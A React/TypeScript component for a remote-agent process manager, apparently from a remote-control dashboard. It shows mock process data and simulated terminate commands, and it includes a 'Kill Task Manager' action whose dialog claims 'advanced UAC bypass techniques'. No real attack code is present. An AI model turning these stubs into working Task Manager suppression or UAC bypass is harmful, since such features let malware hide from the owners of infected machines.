import { useState, useEffect } from "react";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "./ui/card";
import { Button } from "./ui/button";
import { Badge } from "./ui/badge";
import { Input } from "./ui/input";
import { ScrollArea } from "./ui/scroll-area";
import { Progress } from "./ui/progress";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "./ui/select";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
  AlertDialogTrigger,
} from "./ui/alert-dialog";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "./ui/table";
import {
  Zap,
  X,
  Search,
  RefreshCw,
  AlertTriangle,
  Shield,
  Clock,
  Cpu,
  MemoryStick,
  HardDrive,
  Activity,
  Filter,
  SortAsc,
  SortDesc,
} from "lucide-react";
import { toast } from "sonner";

interface Process {
  pid: number;
  name: string;
  username: string;
  cpu: number;
  memory: number;
  status: "running" | "sleeping" | "zombie" | "stopped";
  ppid: number;
  cmdline: string;
  create_time: number;
  priority: number;
  nice: number;
  num_threads: number;
}

interface ProcessManagerProps {
  agentId: string | null;
  isConnected: boolean;
}

export function ProcessManager({ agentId, isConnected }: ProcessManagerProps) {
  const [processes, setProcesses] = useState<Process[]>([]);
  const [filteredProcesses, setFilteredProcesses] = useState<Process[]>([]);
  const [loading, setLoading] = useState(false);
  const [searchTerm, setSearchTerm] = useState("");
  const [selectedProcess, setSelectedProcess] = useState<Process | null>(null);
  const [sortField, setSortField] = useState<keyof Process>("cpu");
  const [sortDirection, setSortDirection] = useState<"asc" | "desc">("desc");
  const [filterStatus, setFilterStatus] = useState<string>("all");
  const [refreshInterval, setRefreshInterval] = useState<number>(5000);
  const [autoRefresh, setAutoRefresh] = useState(false);

  // Mock process data - in real implementation, this would come from the agent
  const mockProcesses: Process[] = [
    {
      pid: 1234,
      name: "chrome.exe",
      username: "user",
      cpu: 15.2,
      memory: 512.8,
      status: "running",
      ppid: 1000,
      cmdline: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
      create_time: Date.now() - 3600000,
      priority: 8,
      nice: 0,
      num_threads: 24,
    },
    {
      pid: 5678,
      name: "code.exe",
      username: "user",
      cpu: 8.7,
      memory: 256.4,
      status: "running",
      ppid: 1000,
      cmdline: "C:\\Users\\user\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe",
      create_time: Date.now() - 7200000,
      priority: 8,
      nice: 0,
      num_threads: 16,
    },
    {
      pid: 9012,
      name: "taskmgr.exe",
      username: "user",
      cpu: 2.1,
      memory: 32.1,
      status: "running",
      ppid: 1000,
      cmdline: "C:\\Windows\\System32\\taskmgr.exe",
      create_time: Date.now() - 900000,
      priority: 13,
      nice: 0,
      num_threads: 8,
    },
    {
      pid: 3456,
      name: "notepad.exe",
      username: "user",
      cpu: 0.1,
      memory: 12.3,
      status: "sleeping",
      ppid: 1000,
      cmdline: "C:\\Windows\\System32\\notepad.exe",
      create_time: Date.now() - 1800000,
      priority: 8,
      nice: 0,
      num_threads: 2,
    },
    {
      pid: 7890,
      name: "svchost.exe",
      username: "SYSTEM",
      cpu: 1.2,
      memory: 45.6,
      status: "running",
      ppid: 584,
      cmdline: "C:\\Windows\\System32\\svchost.exe -k NetworkService",
      create_time: Date.now() - 86400000,
      priority: 8,
      nice: 0,
      num_threads: 12,
    },
  ];

  // Fetch processes from agent
  const fetchProcesses = async () => {
    if (!agentId || !isConnected) {
      setProcesses([]);
      return;
    }

    setLoading(true);
    try {
      // Simulate API call to agent
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      // Add some randomization to simulate real data
      const updatedProcesses = mockProcesses.map(proc => ({
        ...proc,
        cpu: Math.max(0, proc.cpu + (Math.random() - 0.5) * 2),
        memory: Math.max(0, proc.memory + (Math.random() - 0.5) * 10),
      }));
      
      setProcesses(updatedProcesses);
      toast.success("Process list updated");
    } catch (error) {
      console.error("Failed to fetch processes:", error);
      toast.error("Failed to fetch process list");
    } finally {
      setLoading(false);
    }
  };

  // Terminate process
  const terminateProcess = async (process: Process, force: boolean = false) => {
    if (!agentId || !isConnected) {
      toast.error("No agent connected");
      return;
    }

    try {
      // Simulate termination command
      const command = force 
        ? `terminate-process:${process.pid}:force`
        : `terminate-process:${process.pid}`;
      
      console.log("Sending termination command:", command);
      
      // Simulate success/failure
      const success = Math.random() > 0.1; // 90% success rate
      
      if (success) {
        setProcesses(prev => prev.filter(p => p.pid !== process.pid));
        toast.success(`Process ${process.name} (PID: ${process.pid}) terminated`);
      } else {
        toast.error(`Failed to terminate process ${process.name} (PID: ${process.pid})`);
      }
    } catch (error) {
      console.error("Failed to terminate process:", error);
      toast.error("Failed to terminate process");
    }
  };

  // Kill Task Manager specifically
  const killTaskManager = async () => {
    if (!agentId || !isConnected) {
      toast.error("No agent connected");
      return;
    }

    try {
      console.log("Sending kill-taskmgr command");
      
      // Remove Task Manager processes from the list
      setProcesses(prev => prev.filter(p => !p.name.toLowerCase().includes("taskmgr")));
      toast.success("Task Manager processes terminated");
    } catch (error) {
      console.error("Failed to kill Task Manager:", error);
      toast.error("Failed to terminate Task Manager");
    }
  };

  // Filter and sort processes
  useEffect(() => {
    let filtered = processes.filter(process => {
      const matchesSearch = searchTerm === "" ||
        process.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
        process.cmdline.toLowerCase().includes(searchTerm.toLowerCase()) ||
        process.pid.toString().includes(searchTerm);

      const matchesStatus = filterStatus === "all" || process.status === filterStatus;

      return matchesSearch && matchesStatus;
    });

    // Sort processes
    filtered.sort((a, b) => {
      const aValue = a[sortField];
      const bValue = b[sortField];
      
      let comparison = 0;
      if (aValue < bValue) comparison = -1;
      if (aValue > bValue) comparison = 1;
      
      return sortDirection === "asc" ? comparison : -comparison;
    });

    setFilteredProcesses(filtered);
  }, [processes, searchTerm, filterStatus, sortField, sortDirection]);

  // Auto-refresh
  useEffect(() => {
    if (autoRefresh && agentId && isConnected) {
      const interval = setInterval(fetchProcesses, refreshInterval);
      return () => clearInterval(interval);
    }
  }, [autoRefresh, refreshInterval, agentId, isConnected]);

  // Initial load
  useEffect(() => {
    if (agentId && isConnected) {
      fetchProcesses();
    }
  }, [agentId, isConnected]);

  const getStatusBadge = (status: Process["status"]) => {
    switch (status) {
      case "running":
        return <Badge variant="default">Running</Badge>;
      case "sleeping":
        return <Badge variant="secondary">Sleeping</Badge>;
      case "zombie":
        return <Badge variant="destructive">Zombie</Badge>;
      case "stopped":
        return <Badge variant="outline">Stopped</Badge>;
      default:
        return <Badge variant="secondary">{status}</Badge>;
    }
  };

  const formatUptime = (createTime: number) => {
    const uptime = Date.now() - createTime;
    const hours = Math.floor(uptime / (1000 * 60 * 60));
    const minutes = Math.floor((uptime % (1000 * 60 * 60)) / (1000 * 60));
    return `${hours}h ${minutes}m`;
  };

  const formatMemory = (bytes: number) => {
    return `${bytes.toFixed(1)} MB`;
  };

  return (
    <div className="space-y-6">
      {/* Process Manager Header */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <Activity className="h-5 w-5" />
            Process Manager
          </CardTitle>
          <CardDescription>
            Monitor and manage system processes with advanced termination capabilities
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          {/* Controls */}
          <div className="flex flex-col sm:flex-row gap-4">
            <div className="flex-1">
              <div className="relative">
                <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-muted-foreground" />
                <Input
                  placeholder="Search processes by name, PID, or command..."
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                  className="pl-10"
                />
              </div>
            </div>
            
            <div className="flex gap-2">
              <Select value={filterStatus} onValueChange={setFilterStatus}>
                <SelectTrigger className="w-32">
                  <Filter className="h-4 w-4 mr-2" />
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="all">All Status</SelectItem>
                  <SelectItem value="running">Running</SelectItem>
                  <SelectItem value="sleeping">Sleeping</SelectItem>
                  <SelectItem value="stopped">Stopped</SelectItem>
                  <SelectItem value="zombie">Zombie</SelectItem>
                </SelectContent>
              </Select>

              <Button
                onClick={fetchProcesses}
                disabled={!agentId || !isConnected || loading}
                variant="outline"
                size="default"
              >
                <RefreshCw className={`h-4 w-4 mr-2 ${loading ? "animate-spin" : ""}`} />
                Refresh
              </Button>
            </div>
          </div>

          {/* Quick Actions */}
          <div className="flex flex-wrap gap-2">
            <AlertDialog>
              <AlertDialogTrigger asChild>
                <Button
                  variant="destructive"
                  size="sm"
                  disabled={!agentId || !isConnected}
                  className="flex items-center gap-2"
                >
                  <Shield className="h-4 w-4" />
                  Kill Task Manager
                </Button>
              </AlertDialogTrigger>
              <AlertDialogContent>
                <AlertDialogHeader>
                  <AlertDialogTitle>Terminate Task Manager?</AlertDialogTitle>
                  <AlertDialogDescription>
                    This will terminate all Task Manager processes using advanced UAC bypass techniques.
                    This action cannot be undone.
                  </AlertDialogDescription>
                </AlertDialogHeader>
                <AlertDialogFooter>
                  <AlertDialogCancel>Cancel</AlertDialogCancel>
                  <AlertDialogAction onClick={killTaskManager}>
                    Terminate
                  </AlertDialogAction>
                </AlertDialogFooter>
              </AlertDialogContent>
            </AlertDialog>

            <div className="flex items-center gap-2">
              <label className="text-sm text-muted-foreground">Auto-refresh:</label>
              <Button
                variant={autoRefresh ? "default" : "outline"}
                size="sm"
                onClick={() => setAutoRefresh(!autoRefresh)}
                disabled={!agentId || !isConnected}
              >
                <Clock className="h-4 w-4 mr-1" />
                {autoRefresh ? "ON" : "OFF"}
              </Button>
              {autoRefresh && (
                <Select
                  value={refreshInterval.toString()}
                  onValueChange={(value) => setRefreshInterval(parseInt(value))}
                >
                  <SelectTrigger className="w-20">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="1000">1s</SelectItem>
                    <SelectItem value="5000">5s</SelectItem>
                    <SelectItem value="10000">10s</SelectItem>
                    <SelectItem value="30000">30s</SelectItem>
                  </SelectContent>
                </Select>
              )}
            </div>
          </div>

          {/* Process Stats */}
          <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
            <div className="text-center">
              <div className="text-2xl font-bold">{processes.length}</div>
              <div className="text-sm text-muted-foreground">Total Processes</div>
            </div>
            <div className="text-center">
              <div className="text-2xl font-bold">
                {processes.filter(p => p.status === "running").length}
              </div>
              <div className="text-sm text-muted-foreground">Running</div>
            </div>
            <div className="text-center">
              <div className="text-2xl font-bold">
                {processes.reduce((sum, p) => sum + p.cpu, 0).toFixed(1)}%
              </div>
              <div className="text-sm text-muted-foreground">Total CPU</div>
            </div>
            <div className="text-center">
              <div className="text-2xl font-bold">
                {(processes.reduce((sum, p) => sum + p.memory, 0) / 1024).toFixed(1)} GB
              </div>
              <div className="text-sm text-muted-foreground">Total Memory</div>
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Process List */}
      <Card>
        <CardHeader>
          <CardTitle>Process List ({filteredProcesses.length} processes)</CardTitle>
          {!agentId && (
            <CardDescription className="text-yellow-600">
              Select an agent to view and manage processes
            </CardDescription>
          )}
        </CardHeader>
        <CardContent>
          <ScrollArea className="h-96">
            <Table>
              <TableHeader>
                <TableRow>
                  <TableHead>
                    <Button
                      variant="ghost"
                      size="sm"
                      onClick={() => {
                        setSortField("pid");
                        setSortDirection(sortField === "pid" && sortDirection === "asc" ? "desc" : "asc");
                      }}
                      className="h-8 p-0 font-medium"
                    >
                      PID
                      {sortField === "pid" && (
                        sortDirection === "asc" ? <SortAsc className="ml-1 h-3 w-3" /> : <SortDesc className="ml-1 h-3 w-3" />
                      )}
                    </Button>
                  </TableHead>
                  <TableHead>
                    <Button
                      variant="ghost"
                      size="sm"
                      onClick={() => {
                        setSortField("name");
                        setSortDirection(sortField === "name" && sortDirection === "asc" ? "desc" : "asc");
                      }}
                      className="h-8 p-0 font-medium"
                    >
                      Name
                      {sortField === "name" && (
                        sortDirection === "asc" ? <SortAsc className="ml-1 h-3 w-3" /> : <SortDesc className="ml-1 h-3 w-3" />
                      )}
                    </Button>
                  </TableHead>
                  <TableHead>Status</TableHead>
                  <TableHead>
                    <Button
                      variant="ghost"
                      size="sm"
                      onClick={() => {
                        setSortField("cpu");
                        setSortDirection(sortField === "cpu" && sortDirection === "asc" ? "desc" : "asc");
                      }}
                      className="h-8 p-0 font-medium"
                    >
                      <Cpu className="mr-1 h-3 w-3" />
                      CPU %
                      {sortField === "cpu" && (
                        sortDirection === "asc" ? <SortAsc className="ml-1 h-3 w-3" /> : <SortDesc className="ml-1 h-3 w-3" />
                      )}
                    </Button>
                  </TableHead>
                  <TableHead>
                    <Button
                      variant="ghost"
                      size="sm"
                      onClick={() => {
                        setSortField("memory");
                        setSortDirection(sortField === "memory" && sortDirection === "asc" ? "desc" : "asc");
                      }}
                      className="h-8 p-0 font-medium"
                    >
                      <MemoryStick className="mr-1 h-3 w-3" />
                      Memory
                      {sortField === "memory" && (
                        sortDirection === "asc" ? <SortAsc className="ml-1 h-3 w-3" /> : <SortDesc className="ml-1 h-3 w-3" />
                      )}
                    </Button>
                  </TableHead>
                  <TableHead>User</TableHead>
                  <TableHead>Uptime</TableHead>
                  <TableHead>Actions</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {filteredProcesses.length === 0 ? (
                  <TableRow>
                    <TableCell colSpan={8} className="text-center py-8 text-muted-foreground">
                      {!agentId ? "Select an agent to view processes" : 
                       loading ? "Loading processes..." : 
                       "No processes found matching your criteria"}
                    </TableCell>
                  </TableRow>
                ) : (
                  filteredProcesses.map((process) => (
                    <TableRow key={process.pid}>
                      <TableCell className="font-mono">{process.pid}</TableCell>
                      <TableCell>
                        <div>
                          <div className="font-medium">{process.name}</div>
                          {process.cmdline.length > 50 && (
                            <div className="text-xs text-muted-foreground truncate max-w-xs">
                              {process.cmdline}
                            </div>
                          )}
                        </div>
                      </TableCell>
                      <TableCell>{getStatusBadge(process.status)}</TableCell>
                      <TableCell>
                        <div className="flex items-center gap-2">
                          <span className="font-mono">{process.cpu.toFixed(1)}%</span>
                          <Progress value={Math.min(process.cpu, 100)} className="h-1 w-12" />
                        </div>
                      </TableCell>
                      <TableCell className="font-mono">{formatMemory(process.memory)}</TableCell>
                      <TableCell>
                        <Badge variant={process.username === "SYSTEM" ? "default" : "secondary"}>
                          {process.username}
                        </Badge>
                      </TableCell>
                      <TableCell className="font-mono text-sm">
                        {formatUptime(process.create_time)}
                      </TableCell>
                      <TableCell>
                        <div className="flex gap-1">
                          <AlertDialog>
                            <AlertDialogTrigger asChild>
                              <Button
                                variant="outline"
                                size="sm"
                                disabled={!agentId || !isConnected}
                              >
                                <X className="h-3 w-3" />
                              </Button>
                            </AlertDialogTrigger>
                            <AlertDialogContent>
                              <AlertDialogHeader>
                                <AlertDialogTitle>Terminate Process?</AlertDialogTitle>
                                <AlertDialogDescription>
                                  Are you sure you want to terminate <strong>{process.name}</strong> (PID: {process.pid})?
                                  This action cannot be undone.
                                </AlertDialogDescription>
                              </AlertDialogHeader>
                              <AlertDialogFooter>
                                <AlertDialogCancel>Cancel</AlertDialogCancel>
                                <AlertDialogAction
                                  onClick={() => terminateProcess(process, false)}
                                >
                                  Terminate
                                </AlertDialogAction>
                                <AlertDialogAction
                                  onClick={() => terminateProcess(process, true)}
                                  className="bg-destructive text-destructive-foreground hover:bg-destructive/90"
                                >
                                  <Zap className="h-3 w-3 mr-1" />
                                  Force Kill
                                </AlertDialogAction>
                              </AlertDialogFooter>
                            </AlertDialogContent>
                          </AlertDialog>
                        </div>
                      </TableCell>
                    </TableRow>
                  ))
                )}
              </TableBody>
            </Table>
          </ScrollArea>
        </CardContent>
      </Card>
    </div>
  );
}